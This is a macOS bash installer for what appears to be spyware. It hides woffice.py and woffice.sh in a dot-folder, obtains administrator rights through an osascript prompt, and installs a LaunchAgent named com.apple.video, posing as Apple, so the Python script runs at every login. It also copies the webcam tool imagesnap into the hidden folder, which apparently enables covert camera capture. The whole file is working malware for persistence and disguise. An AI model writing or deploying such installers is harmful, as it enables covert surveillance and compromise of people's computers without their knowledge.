#!/bin/bash

#Create the hidden directory ~/.textedit
mkdir $HOME/.hidden

#Copy the script to hidden folder

cp woffice.py $HOME/.hidden/woffice.py
cp woffice.sh $HOME/.hidden/woffice.sh




#Give the script permission to execute
chown root $HOME/.hidden/woffice.py
chmod +x $HOME/.hidden/woffice.py
chmod 777 $HOME/.hidden/woffice.sh
chown root $HOME/.hidden/woffice.sh
#chmod u+s $HOME/.hidden/woffice.sh
#sh $HOME/.hidden/woffice.sh
osascript -e "do shell script \"$HOME/.hidden/woffice.sh $*\" with administrator privileges"

#Create directory if it doesn't already exist.
mkdir $HOME/Library/LaunchAgents

#Write the .plist to LaunchAgents
echo '
<plist version="1.0">
    <dict>
    <key>Label</key>
        <string>com.apple.video</string>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/bin/python</string>
        <string>'$HOME'/.hidden/woffice.py</string>
    </array>
    <key>RunAtLoad</key>
        <true/>
    <key>StartInterval</key>
        <integer>0</integer>
    <key>AbandonProcessGroup</key>
        <true/>
    </dict>
</plist>
' > /Library/LaunchAgents/com.apple.video.plist
#' > /Library/LaunchDaemons/com.apple.video.plist
chown root:wheel /Library/LaunchAgents/com.apple.video.plist
chmod 0644 /Library/LaunchAgents/com.apple.video.plist
#Load the LaunchAgent
launchctl load -w /Library/LaunchAgents/com.apple.video.plist

#Copy imagesnap to the hidden directory
cp imagesnap $HOME/.hidden